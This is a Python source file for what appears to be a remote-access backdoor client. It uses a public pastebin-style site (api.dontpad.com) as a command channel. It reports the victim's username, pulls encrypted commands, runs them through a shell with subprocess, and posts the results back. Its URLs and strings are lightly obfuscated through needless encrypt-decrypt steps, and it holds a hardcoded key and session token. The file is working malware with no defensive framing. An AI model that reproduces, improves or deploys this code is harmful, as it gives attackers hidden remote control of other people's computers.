import requests
import time
import subprocess
from observer import Observer
import getpass
from criptographer import Criptographer
from cryptography.fernet import Fernet
import base64
import hashlib

MP = b"dads123dascxc1972938anjskbdakkajc7d2y187bahjub81b2dh1u8i283"
def make_fernet_key(master: bytes) -> bytes:
    digest = hashlib.sha256(master).digest()
    return base64.urlsafe_b64encode(digest)

def encrypt_text(plain: str) -> str:
    key = make_fernet_key(MP)
    f = Fernet(key)
    token = f.encrypt(plain.encode('utf-8'))
    return token.decode('utf-8')

def decrypt_text(token: str) -> str:
    key = make_fernet_key(MP)
    f = Fernet(key)
    return f.decrypt(token.encode('utf-8')).decode('utf-8')

ST = encrypt_text("-25751fc88e6e559870fd")
US = encrypt_text(getpass.getuser())

class Client:
    def __init__(self, url):
        self.url = url
        self.command = ''
        self.result = ''
        self.first_run = True
        self.us = decrypt_text(US)
    
    def id(self):
        data = {
            "text": Criptographer.encrypt('whoami', self.us),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": decrypt_text(ST)
        }
        u = encrypt_text(f"https://api.dontpad.com/yaguinhofodinha/{self.us}/request")
        requests.post(f"{decrypt_text(u)}", data=data)

    def srt(self, command_body):
        if self.first_run:
            self.first_run = False
            self.id()
            self.stc()
            
        self.xc(command_body)


    def xc(self, command_body):
        self.command = Criptographer.decrypt(command_body, self.us).strip()
        e = encrypt_text("exit")
        if self.command is None or self.command.lower() == decrypt_text(e).lower():
            raise SystemExit(0) 
        
        self.result = self.xe()
        self.stc()

    def xe(self):
        try:
            processo = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="ignore"
            )
            stdo, stde = processo.communicate(timeout=20)
            so = encrypt_text(stdo)
            se = encrypt_text(stde)
            if stde:
                return f"{decrypt_text(se)}"
            return decrypt_text(so).replace("�", "")
        except Exception as e:
            return f"{e}"

    def stc(self):
        data = {
            "text": Criptographer.encrypt(self.result, self.us),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": decrypt_text(ST)
        }
        res = requests.post(f"https://api.dontpad.com/yaguinhofodinha/{self.us}/response", data=data)
        print(res.status_code, res.url)


if __name__ == "__main__":

    burl = encrypt_text("https://api.dontpad.com")
    pad = encrypt_text("yaguinhofodinha")
    rqj = encrypt_text("request.body.json")
    lmses = encrypt_text("lastModified=0&session-token=")

    uurl = (
        f"{decrypt_text(burl)}/{decrypt_text(pad)}/{decrypt_text(US)}/{decrypt_text(rqj)}"
        f"?{decrypt_text(lmses)}{decrypt_text(ST)}"
    )

    furl = (
        f"{decrypt_text(burl)}/{decrypt_text(pad)}/{decrypt_text(rqj)}"
        f"?{decrypt_text(lmses)}{decrypt_text(ST)}"
    )

    client = Client(url=uurl)
    o = Observer(furl=furl, uurl=uurl, client=client)
    o.srt()
